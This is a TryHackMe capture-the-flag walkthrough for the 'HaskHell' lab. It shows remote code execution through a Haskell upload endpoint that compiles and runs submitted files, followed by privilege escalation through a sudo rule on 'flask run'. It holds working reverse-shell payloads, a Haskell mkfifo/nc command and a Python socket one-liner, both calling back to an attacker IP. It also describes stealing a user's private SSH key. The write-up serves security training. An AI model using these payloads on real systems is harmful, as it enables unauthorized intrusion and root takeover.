# HaskHell

***

Platform: [Tryhackme](https://tryhackme.com/room/haskhell)

Difficulty: Medium

Initial Access: RCE via Insecure file upload

Privilege Escalation: Misconfigured sudo privileges.

***

Nmap Scan:

```bash
┌──(ghost㉿kali)-[~/tryhackme/haskhell]
└─$ sudo nmap -Pn -A -p- --min-rate 4000 10.201.50.43 -oN nmap.full
[sudo] password for ghost: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 00:49 EDT
Nmap scan report for 10.201.50.43
Host is up (0.25s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1d:f3:53:f7:6d:5b:a1:d4:84:51:0d:dd:66:40:4d:90 (RSA)
|   256 26:7c:bd:33:8f:bf:09:ac:9e:e3:d3:0a:c3:34:bc:14 (ECDSA)
|_  256 d5:fb:55:a0:fd:e8:e1:ab:9e:46:af:b8:71:90:00:26 (ED25519)
5001/tcp open  http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: Homepage
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Ports       | Methodology                                                                                               |
| ----------- | --------------------------------------------------------------------------------------------------------- |
| 22 (SSH)    | Potentially for later use.                                                                                |
| 5001 (HTTP) | Gunicorn 19.7.1, maybe vulnerable version, but first have to look at what is running on this http server. |

***

### Initial Enumeration

On port 5001, there was some type of static website hosted.

<figure><img src="https://github.com/user-attachments/assets/dbbc49f8-3ac0-4315-abf5-df0963d9c090" alt=""><figcaption></figcaption></figure>

`/homework1` endpoint:

<figure><img src="https://github.com/user-attachments/assets/9888af50-b4cc-4e36-9316-a215ceb5fa1d" alt=""><figcaption></figcaption></figure>

So, reading above contents of the website shows haskell is going to be taught in this semester and professor had given some homework to students. They can submit it through an endpoint `/upload` , but it’s not found on the server, maybe fuzzing directory will reveal some other endpoints. Main points or hints to note from here:

💡

Only Haskell files are accepted for uploads. Learned that one the hard way last semester...

Your file will be compiled and ran and all output will be piped to a file under the uploads directory.

<figure><img src="https://github.com/user-attachments/assets/71927165-44b7-4231-99a6-5ea34e8dea9a" alt=""><figcaption></figcaption></figure>

Directory fuzzing revealed an endpoint `/submit` , and here we can submit our homework files.

<div data-full-width="false"><figure><img src="https://github.com/user-attachments/assets/4ad58386-fb62-4930-a82a-c196b6a26b9f" alt=""><figcaption></figcaption></figure></div>

<figure><img src="https://github.com/user-attachments/assets/320b602e-2bf6-4429-a711-f1f7bf5ee546" alt=""><figcaption></figcaption></figure>

***

### Initial Access

So, now the question is what is that haskell? (Searched on google about it)

Haskell is a modern, standard, purely functional programming and non-strict language. It is Specially designed to handle a wide range of applications, from numerical through to symbolic. It has an expressive syntax and very rich inbuilt architecture.

Let’s code a simple print command in haskell:

```bash
main = putStrLn "Hello, Haskell!"
```

Save this code in a file named test.hs and let’s try to upload it to the server.

<figure><img src="https://github.com/user-attachments/assets/d6baf1c0-7fc9-4331-b97f-329ef148aae4" alt=""><figcaption></figcaption></figure>

And the server compiles our code, run it and also save it to `/uploads/<filename>` location.

<figure><img src="https://github.com/user-attachments/assets/25e9ef8b-0e22-4b69-ba89-1a12924b74bf" alt=""><figcaption></figcaption></figure>

Searched on google more about how to execute system commands using haskell code and found the method.

Write reverse shell code in haskell and saved it to a file named haskell.hs:

```bash
import System.Process

main = do
callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.17.87.131 4445 >/tmp/f"
```

Uploaded that file on the submit page.

<figure><img src="https://github.com/user-attachments/assets/9d0e4891-3985-403c-920b-708e87f78aca" alt=""><figcaption></figcaption></figure>

It automatically compiles that code and run it , which triggered reverse shell on our attacker machine.

<figure><img src="https://github.com/user-attachments/assets/9000c0af-8ecc-47d1-9900-4f25fca3b917" alt=""><figcaption></figcaption></figure>

***

### Shell as prof

Enumerating machine with flask user’s account revealed 2 more user’s account that were present in that machine: `haskell` and `prof`

User flask can also read directories of both the users.

<figure><img src="https://github.com/user-attachments/assets/e6906719-3504-4496-ab83-e4d23ea80b69" alt=""><figcaption></figcaption></figure>

Lookind inside prof user’s directory revealed user flag.

<figure><img src="https://github.com/user-attachments/assets/c8f297a7-a572-4c5c-8f1b-24c9ffe662d2" alt=""><figcaption></figcaption></figure>

Also able to read the `id_rsa` file(private rsa key) of user prof inside `/home/prof/.ssh`

<figure><img src="https://github.com/user-attachments/assets/eb161022-9f6e-4aae-b3f3-dfbf15e94cea" alt=""><figcaption></figcaption></figure>

Copied it our attacker machine, gave it suitable permission and logged in to user prof’s account via ssh.

<figure><img src="https://github.com/user-attachments/assets/99798796-dbcd-428c-a471-14a636b704a7" alt=""><figcaption></figcaption></figure>

***

### Shell as root

Checking sudo privileges of user prof revealed user prof can run `/usr/bin/flask run` as root.

<figure><img src="https://github.com/user-attachments/assets/ed9cefbd-e7a4-403b-a83a-49a4c9e94cbf" alt=""><figcaption></figcaption></figure>

Tried running that command with sudo privileges and throws some error:

<figure><img src="https://github.com/user-attachments/assets/b5d7627a-e301-41ef-8119-550aab16d1ad" alt=""><figcaption></figcaption></figure>

Searching about this error on google, showed this error means Flask doesn’t know which Python file contains your application instance. Which means let’s say your flask application file is `app.py` then we have set it to environment variable like these: `export FLASK_APP=app.py` .

Which means we can make any python file which contains reverse shell code in python and can set it to environment variables like above and running that flask run with sudo privileges can provide us root shell.

created a python file named `rev.py` and wrote python reverse shell code inside it.

```python
import os,pty,socket;s=socket.socket();s.connect(("10.17.87.131",4446));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")
```

<figure><img src="https://github.com/user-attachments/assets/e0fb9515-42dc-4a1d-bc9a-a3cae23f1d44" alt=""><figcaption></figcaption></figure>

Set it to environment variable and run it.

```bash
prof@haskhell:~$ export FLASK_APP=rev.py
prof@haskhell:~$ sudo /usr/bin/flask run
```

On our attacker machine, reverse shell got triggered as root on the target machine.

<figure><img src="https://github.com/user-attachments/assets/3efcfda3-421a-46b1-ab24-6edb971cb089" alt=""><figcaption></figcaption></figure>

Grabbed the root flag

<figure><img src="https://github.com/user-attachments/assets/c40978b8-08d1-42fc-825c-b53b5543b9f3" alt=""><figcaption></figcaption></figure>

***

That’s it for this machine.✅
